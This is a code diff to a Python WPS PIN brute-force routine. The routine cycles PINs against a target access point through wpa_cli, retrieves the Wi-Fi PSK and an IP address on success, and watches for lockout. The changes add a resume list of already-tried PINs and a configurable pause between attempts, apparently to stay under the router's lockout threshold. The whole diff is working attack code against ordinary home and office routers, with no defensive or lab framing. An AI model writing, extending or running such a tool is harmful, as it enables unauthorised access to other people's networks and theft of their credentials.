@@ -56,18 +56,25 @@ def _networks(ctrl, iface):
 
 
 def sweep(bssid, ssid, pins, outdir, log, wait_s=None, max_ignored=None,
-          ctrl=config.CTRL_DIR, iface=config.IFACE):
-    """Try WPS PINs in order. Returns {'pin'|'reason', ...}.
+          ctrl=config.CTRL_DIR, iface=config.IFACE, done=None, gap_s=0):
+    """Try WPS PINs in order. Returns {'pin'|'reason', ...} plus attempted_pins.
 
+    done: set of PINs to skip (resume). gap_s: quiet seconds between attempts.
     log: callable(msg) for progress lines. Stale networks are cleaned per PIN.
     Aborts early with reason='locked' if the AP stops negotiating.
     """
     import os
     wait_s = config.WPS_WAIT_S if wait_s is None else wait_s
     max_ignored = config.WPS_MAX_IGNORED if max_ignored is None else max_ignored
+    done = done or set()
     os.makedirs(outdir, exist_ok=True)
     attempted, skipped, ignores = 0, 0, 0
+    attempted_pins = []
     for pin in pins:
+        if pin in done:
+            skipped += 1
+            log(f"[skip] {pin}: already tried (resume)")
+            continue
         if not valid_pin(pin):
             skipped += 1
             log(f"[skip] {pin}: bad checksum, never sent")
@@ -80,19 +87,20 @@ def sweep(bssid, ssid, pins, outdir, log, wait_s=None, max_ignored=None,
             log(f"[skip] {pin}: rejected locally ({resp.strip()[:80]})")
             continue
         attempted += 1
-        negotiated, done = False, False
+        attempted_pins.append(pin)
+        negotiated, done_flag = False, False
         deadline = time.time() + wait_s
         while time.time() < deadline:
             _, st = wpa_cli(ctrl, iface, "status")
             m = re.search(r"wpa_state=(\S+)", st)
             state = m.group(1) if m else ""
             if state == "COMPLETED":
-                done = True
+                done_flag = True
                 break
             if state in NEGOTIATING:
                 negotiated = True
             time.sleep(2)
-        if done:
+        if done_flag:
             run(["dhcpcd", "--timeout", str(config.DHCP_TIMEOUT_S), iface], timeout=20)
             time.sleep(2)
             _, ipout = run(["ip", "-4", "-o", "addr", "show", iface], 10)
@@ -103,16 +111,21 @@ def sweep(bssid, ssid, pins, outdir, log, wait_s=None, max_ignored=None,
             if nets:
                 _, psk = wpa_cli(ctrl, iface, "get_network", nets[-1], "psk")
             return {"pin": pin, "psk": psk.strip(), "ip": ip,
-                    "attempted": attempted, "skipped": skipped}
+                    "attempted": attempted, "skipped": skipped,
+                    "attempted_pins": attempted_pins}
         for n in set(_networks(ctrl, iface)) - old:
             wpa_cli(ctrl, iface, "remove_network", n)
         wpa_cli(ctrl, iface, "wps_cancel")
+        if gap_s:
+            time.sleep(gap_s)
         if not negotiated:
             ignores += 1
             log(f"[!] AP ignored PIN {pin} ({ignores} in a row) - possible lockout")
             if ignores >= max_ignored:
-                return {"reason": "locked", "attempted": attempted, "skipped": skipped}
+                return {"reason": "locked", "attempted": attempted, "skipped": skipped,
+                        "attempted_pins": attempted_pins}
         else:
             ignores = 0
             log(f"[ ] PIN {pin} failed (AP negotiated, PIN wrong)")
-    return {"reason": "exhausted", "attempted": attempted, "skipped": skipped}
+    return {"reason": "exhausted", "attempted": attempted, "skipped": skipped,
+            "attempted_pins": attempted_pins}
